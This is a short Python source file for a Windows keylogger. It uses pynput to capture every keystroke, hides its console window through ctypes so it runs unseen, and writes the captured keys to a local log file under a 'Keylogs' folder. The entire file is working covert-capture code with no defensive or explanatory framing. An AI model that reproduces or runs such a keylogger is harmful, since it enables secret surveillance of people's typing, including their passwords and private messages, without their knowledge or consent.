import ctypes
import pynput

from pynput.keyboard import Key, Listener

def hide_console_window():
    console_handle = ctypes.windll.kernel32.GetConsoleWindow()
    if console_handle:
        ctypes.windll.user32.ShowWindow(console_handle, 0)

def write_file(keys, log_file_path):
    with open(log_file_path, 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)

keys = []

def on_press(key):
    keys.append(key)
    log_file_path = 'C:\\Users\\abdul\\OneDrive\\Desktop\\Keylogs\\LogsOut\\py-log.txt'
    write_file(keys, log_file_path)
    
    try:
        print(format(key.char))
    except AttributeError:
        print(format(key))

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

if __name__ == "__main__":
    hide_console_window()
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()